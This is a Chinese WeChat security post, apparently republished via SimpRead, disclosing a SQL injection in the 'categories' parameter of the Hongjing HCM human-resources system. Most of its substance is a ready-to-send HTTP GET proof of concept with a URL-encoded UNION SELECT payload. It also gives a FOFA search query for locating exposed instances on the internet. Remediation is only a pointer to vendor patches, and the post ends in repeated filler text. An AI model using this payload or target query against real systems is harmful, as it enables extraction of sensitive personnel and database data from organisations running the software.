<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/z6gFDs45JYynbhndWA251g)

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBW0oRLickDlwBXcvdg0O19gnebUeltmibDpIdnE7pZS608XbClUn5GruVUKjqWFhIQlyk0Bzjs5N8g/640?wx_fmt=png)

0x01 漏洞描述

宏景 HCM 系统是一款由宏景软件研发的系统，主要功能包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助，还具备了报表功能和灵活的表格工具，支持集团管控、目标管理、领导决策等应用。宏景 HCM 系统 categories 处存在 SQL 注入漏洞，攻击者可以从其中获取数据库敏感信息。

0x02 影响版本

```
宏景HCM人力资源管理系统

```

0x03 漏洞复现

FOFA 空间搜索引擎语句  

```
icon_hash="947874108"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBTtWzkFz125f0T7Ya3PGr9U94US1QNFOsN2NF0gTicAQpsEYtTlibfhlZkzoAbCmVqPU767P8guy0Q/640?wx_fmt=png)

登录页面是这个酱紫

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBTtWzkFz125f0T7Ya3PGr9Kib1Z6xrss7HxGib5Xm0Msvxt8iakUbJuyJ5WhmJ2qNE12icDXQPT4IfEw/640?wx_fmt=png)

PoC：

```
GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBTtWzkFz125f0T7Ya3PGr92icmLz32sVAQeCdficn1QA1BS9FVX3znlMLDTeIxah2mg7XzXNm5jXVg/640?wx_fmt=png)

脚本验证：  

![](https://mmbiz.qpic.cn/mmbiz_png/ukiacpKckBCBTtWzkFz125f0T7Ya3PGr95LyHr9KueUNCz7OoPRvVRAsJMosKFIx1E8S7r8kOxHkRtT3rERm0Cg/640?wx_fmt=png)

0x04 修复方案

```
建议及时更新官方补丁：
http://hjsoft.com.cn/

```

觉得内容不错，就点下 “_**赞**_” 和 “_**在看**_”_**  
如侵权请私聊公众号删文**_

_**=========================  
**_

_**凑字数凑字数**_

_**_**凑字数凑字数**_**_

_**__**凑字数凑字数**__**_

_**__**_**凑字数凑字数**_**__**_

_**__**_**_**凑字数凑字数**_**_**__**_

_**__**_**_**_**凑字数凑字数**_**_**_**__**_

_**__**_**_**_**_**凑字数凑字数**_**_**_**_**__**_

_**__**_**_**_**_**_**凑字数凑字数**_**凑字数凑字数**__**_**_**_**_**__**_

_**__**_**_**_**_**___**凑字数凑字数**_**凑字数凑字数**____**_**_**_**_**__**_

_**__**_**_**_**_**____**_**凑字数凑字数**_**凑字数凑字数**__**____**_**_**_**_**__**_

_**__**_**_**_**_**____**___**凑字数凑字数**___**____**_**_**_**_**__**_

_**__**_**_**_**_**____**___**凑字数凑字数**___**____**_**_**_**_**__**_

_**__**_**_**_**_**____**____**凑字数凑字数**____**____**_**_**_**_**__**_

_**__**_**_**_**_**____**_____**凑字数凑字数**_____**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**凑字数凑字数**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**_**凑字数凑字数**_**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**__**凑字数凑字数**__**______**____**_**_**_**_**__**_

_**__**_**_**_**_**____**______**___**=========================**___**______**____**_**_**_**_**__**_